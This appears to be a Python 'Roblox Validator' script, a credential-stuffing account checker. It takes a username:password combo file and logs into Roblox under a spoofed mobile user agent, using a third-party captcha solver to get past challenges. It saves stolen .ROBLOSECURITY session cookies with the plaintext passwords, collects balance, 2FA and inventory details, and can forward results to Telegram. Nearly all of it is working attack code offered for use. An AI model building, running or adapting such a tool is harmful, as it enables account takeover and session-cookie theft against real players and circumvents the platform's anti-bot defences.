import os
import re
import json
import time
import random
import requests
import shutil
import pyfiglet
from datetime import datetime, timedelta
import cfont
from colorama import init, Fore, Style
from captcha_solver import ReCaptchaV3

init(autoreset=True)

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def get_terminal_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BRIGHT_RED = "\033[91;1m"
    BRIGHT_GREEN = "\033[92;1m"
    BRIGHT_YELLOW = "\033[93;1m"
    BRIGHT_BLUE = "\033[94;1m"
    BRIGHT_MAGENTA = "\033[95;1m"
    BRIGHT_CYAN = "\033[96;1m"

terminal_width = get_terminal_width()
BOLD_LINE = f"{Colors.BOLD}{'=' * terminal_width}{Colors.RESET}"

def print_Gab_header():
    try:
        cfont.print("Gab", align="center", font="block", colors=["blue"])
    except:
        for line in pyfiglet.figlet_format("Gab", font="slant").splitlines():
            print(f"{Colors.BLUE}{line}{Colors.RESET}")

def cooldown(seconds):
    print(f"{Colors.YELLOW}Cooldown for {seconds} seconds...⏳", end="", flush=True)
    for remaining in range(seconds, 0, -1):
        print(f"\r{Colors.YELLOW}Waiting: {remaining:2d} sec", end="", flush=True)
        time.sleep(1)
    print(f"\r{Colors.YELLOW}Resuming...{' ' * 10}{Colors.RESET}")

def ask_use_telegram():
    choice = input(f"{Colors.CYAN}Send results via Telegram? (y/n): {Colors.RESET}").strip().lower()
    return choice in ["y", "yes"]

BOT_CONFIG_FILE = "bot_config.json"

def load_bot_config():
    if os.path.exists(BOT_CONFIG_FILE):
        try:
            with open(BOT_CONFIG_FILE) as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_bot_config(config):
    with open(BOT_CONFIG_FILE, "w") as f:
        json.dump(config, f)

def get_telegram_config():
    config = load_bot_config()
    if config.get("bot_token") and config.get("chat_id"):
        use_saved = input(f"{Colors.CYAN}Found saved Telegram config. Use it? (y/n): {Colors.RESET}").strip().lower()
        if use_saved in ["y", "yes"]:
            test = input(f"{Colors.CYAN}Send test message? (y/n): {Colors.RESET}").strip().lower()
            if test in ["y", "yes"]:
                send_to_telegram("Test: Telegram bot is working! 👍", config["bot_token"], config["chat_id"])
            return config["bot_token"], config["chat_id"]
    bot_token = input(f"{Colors.CYAN}Enter Telegram Bot Token: {Colors.RESET}").strip()
    chat_id = input(f"{Colors.CYAN}Enter Telegram Chat ID: {Colors.RESET}").strip()
    config["bot_token"] = bot_token
    config["chat_id"] = chat_id
    save_bot_config(config)
    send_to_telegram("Test: Telegram bot is working! 👍", bot_token, chat_id)
    return bot_token, chat_id

def send_to_telegram(message, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
    try:
        r = requests.post(url, data=payload)
        if r.status_code == 200:
            print(f"{Colors.BRIGHT_GREEN}Telegram: Message sent successfully! 😊{Colors.RESET}")
        else:
            print(f"{Colors.RED}Telegram: Failed to send message. Status: {r.status_code} 😢{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}Telegram: Exception occurred: {e}{Colors.RESET}")

BANNER = (
    f"{Colors.BRIGHT_CYAN}Roblox Validator\n"
    "Telegram Channel : https://t.me/AboutGabxc\n"
    "Dev : Gab\n"
    "Telegram User : @xvanngdxc\n"
    "version : 1.1(Test)\n"
    f"{Colors.RESET}"
)

MAIN_LOGIN_URL = "https://www.roblox.com/Login"
AUTH_URL = "https://auth.roblox.com/v1/login"
ACCOUNT_SETTINGS_URL = "https://accountsettings.roblox.com/v1/email"
CURRENCY_URL_TEMPLATE = "https://economy.roblox.com/v1/users/{uid}/currency"
INVENTORY_URL_TEMPLATE = "https://inventory.roblox.com/v1/users/{uid}/items/2/{item_id}/is-owned"
TRANSACTIONS_URL_TEMPLATE = "https://economy.roblox.com/v2/users/{uid}/transaction-types"
COOKIES_FILE = "RobloxPETSIMCOOKIES.txt"

COMMON_HEADERS = {
    "User-Agent": ("Mozilla/5.0 (iPhone; iPhone9,1; CPU iPhone OS 12.4 like Mac OS X) "
                   "AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B176 ROBLOX iOS App 2.428.401006 "
                   "Hybrid RobloxApp/2.428.401006 (GlobalDist; AppleAppStore)"),
    "Pragma": "no-cache"
}
ALTERNATE_HEADERS = COMMON_HEADERS.copy()
SIMPLE_HEADERS = COMMON_HEADERS.copy()

RECAPTCHA_API_KEY = ""
RECAPTCHA_SITE_KEY = ""
captcha_solution = None
last_error = ""

def fetch_favorites(uid):
    url = f"https://favorites.roblox.com/v1/users/{uid}/favorites/places"
    try:
        r = requests.get(url, headers=SIMPLE_HEADERS)
        if r.status_code == 200:
            return r.json().get("data", [])
        return []
    except:
        return []

def fetch_badges(uid):
    url = f"https://badges.roblox.com/v1/users/{uid}/badges"
    try:
        r = requests.get(url, headers=SIMPLE_HEADERS)
        if r.status_code == 200:
            return r.json().get("data", [])
        return []
    except:
        return []

def get_email_verification(session):
    try:
        r = session.get(ACCOUNT_SETTINGS_URL, headers=ALTERNATE_HEADERS)
        if r.status_code == 200:
            data = r.json()
            return data.get("verified", "N/A"), data.get("isTwoStepEnabled", "N/A")
        return "N/A", "N/A"
    except:
        return "N/A", "N/A"

def get_currency(session, uid):
    url = CURRENCY_URL_TEMPLATE.format(uid=uid)
    try:
        r = session.get(url, headers=SIMPLE_HEADERS)
        if r.status_code == 200:
            return r.json().get("robux", "N/A")
        return "N/A"
    except:
        return "N/A"

def check_inventory(session, uid, item_id):
    url = INVENTORY_URL_TEMPLATE.format(uid=uid, item_id=item_id)
    try:
        r = session.get(url, headers=SIMPLE_HEADERS)
        if r.status_code == 200:
            return r.json().get("isOwned", "N/A")
        return "N/A"
    except:
        return "N/A"

def get_transaction_info(session, uid):
    url = TRANSACTIONS_URL_TEMPLATE.format(uid=uid)
    try:
        r = session.get(url, headers=SIMPLE_HEADERS)
        if r.status_code == 200:
            data = r.json()
            return data.get("HasPendingRobux", "N/A"), data.get("HasCurrencyPurchase", "N/A")
        return "N/A", "N/A"
    except:
        return "N/A", "N/A"

def fetch_account_info(session, uid):
    info = {}
    try:
        r = session.get(f"https://users.roblox.com/v1/users/{uid}", headers=SIMPLE_HEADERS)
        if r.status_code == 200:
            data = r.json()
            info.update({
                "UserID": data.get("id", "N/A"),
                "Username": data.get("name", "N/A"),
                "DisplayName": data.get("displayName", "N/A"),
                "Description": data.get("description", "N/A"),
                "JoinDate": data.get("created", "N/A")
            })
        else:
            info["UserID"] = "N/A"
    except:
        info["UserID"] = "N/A"
    try:
        join_date = datetime.fromisoformat(info["JoinDate"].replace("Z", ""))
        info["AccountAgeDays"] = (datetime.now() - join_date).days
    except:
        info["AccountAgeDays"] = "N/A"
    info.update({
        "ProfileURL": f"https://www.roblox.com/users/{uid}/profile",
        "EmailVerified": get_email_verification(session)[0],
        "2FA": str(get_email_verification(session)[1]),
        "BadgeCount": len(fetch_badges(uid)),
        "FavoriteGames": fetch_favorites(uid),
        "Avatar": f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png"
    })
    return info

def login_account(session, username, password, attempt=1, max_attempts=3):
    global last_error, captcha_solution
    r = session.get(MAIN_LOGIN_URL, headers=COMMON_HEADERS)
    if r.status_code != 200 or not r.text.strip():
        last_error = "Failed to load login page"
        print(f"{Colors.RED}[{username}] {last_error}{Colors.RESET}")
        return None
    token_match = re.search(r'<meta name="csrf-token" data-token="(.*?)" />', r.text)
    if not token_match:
        last_error = "CSRF token not found"
        print(f"{Colors.RED}[{username}] {last_error}{Colors.RESET}")
        return None
    csrf_token = token_match.group(1)
    headers = COMMON_HEADERS.copy()
    headers.update({"Content-Type": "application/json", "X-CSRF-TOKEN": csrf_token})
    payload = {"ctype": "Username", "cvalue": username, "password": password}
    r = session.post(AUTH_URL, headers=headers, json=payload)
    try:
        data = r.json()
    except:
        last_error = "Invalid login response"
        print(f"{Colors.RED}[{username}] {last_error}{Colors.RESET}")
        return None
    if "errors" in data:
        for err in data["errors"]:
            msg = err.get("message", "").lower()
            if "challenge is required" in msg:
                solver = ReCaptchaV3(site_key=RECAPTCHA_SITE_KEY, url=MAIN_LOGIN_URL, api_key=RECAPTCHA_API_KEY)
                captcha_solution = solver.solve()
                payload["captcha"] = captcha_solution
                r = session.post(AUTH_URL, headers=headers, json=payload)
                data = r.json()
                break
            last_error = msg
        print(f"{Colors.RED}[{username}] Login failed: {last_error}{Colors.RESET}")
        return None
    user = data.get("user", {})
    if not user.get("id") or user.get("isBanned", False):
        last_error = "Login unsuccessful or banned"
        print(f"{Colors.RED}[{username}] {last_error}{Colors.RESET}")
        return None
    print(f"{Colors.BRIGHT_GREEN}[{username}] Logged in. UID: {user['id']}{Colors.RESET}")
    return user["id"]

def process_account(username, password):
    session = requests.Session()
    uid = login_account(session, username, password)
    if not uid:
        return {"status": "error", "username": username, "message": last_error}
    roblo_cookie = session.cookies.get(".ROBLOSECURITY", "NoCookie")
    datadome = session.cookies.get("datadome", "N/A")
    with open(COOKIES_FILE, "a") as f:
        f.write(f"{username}:{password} | ROBLOSECURITY: {roblo_cookie} | DataDome: {datadome}\n")
    info = fetch_account_info(session, uid)
    return {"username": username, "uid": uid, "status": "valid", "info": info}

def bulk_check(accounts):
    results = []
    count = 0
    total = len(accounts)
    start_time = datetime.now()
    for username, password, _ in accounts:
        print(f"Processing {username} ({count+1}/{total})")
        res = process_account(username, password)
        results.append(res)
        count += 1
        elapsed = datetime.now() - start_time
        print(f"Elapsed: {elapsed}, average per account: {elapsed/count}")
        cooldown(5)
    return results

def read_combo_file(path):
    if not os.path.exists(path):
        return []
    accounts = []
    with open(path) as f:
        for line in f:
            if ":" in line:
                u, p = line.strip().split(":", 1)
                accounts.append((u, p, None))
    return accounts

def format_account_info(acc):
    lines = ["⪻━━━━━━━═『Gab』═━━━━━━━━⪼"]
    if acc["status"] == "valid":
        lines.append("✅ Valid")
    else:
        lines.append("❌ Invalid")
    lines.append(f"USER: {acc['username']}")
    info = acc.get("info", {})
    for k, v in info.items():
        lines.append(f"{k}: {v}")
    lines.append("⪻━━━━━━━━━━━━━━━━━━━━━━━━━━━⪼")
    return "\n".join(lines)

def main():
    clear_console()
    print_Gab_header()
    print(BOLD_LINE)
    print(BANNER)
    path = input("Enter combo file path: ").strip()
    accounts = read_combo_file(path)
    if not accounts:
        print("No valid accounts found. Exiting.")
        return
    use_telegram = ask_use_telegram()
    if use_telegram:
        bot_token, chat_id = get_telegram_config()
    results = []
    bulk = input("Bulk check? (y/n): ").strip().lower() in ["y", "yes"]
    if bulk:
        results = bulk_check(accounts)
    else:
        u = input("Username: ").strip()
        p = input("Password: ").strip()
        results = [process_account(u, p)]
    for acc in results:
        print(format_account_info(acc))
    valid = [a for a in results if a["status"] == "valid"]
    if valid:
        with open("ValidAccounts.txt", "w") as f:
            for a in valid:
                f.write(f"{a['username']} | UID: {a['uid']}\n")
        print("Valid accounts saved to ValidAccounts.txt")

if __name__ == "__main__":
    main()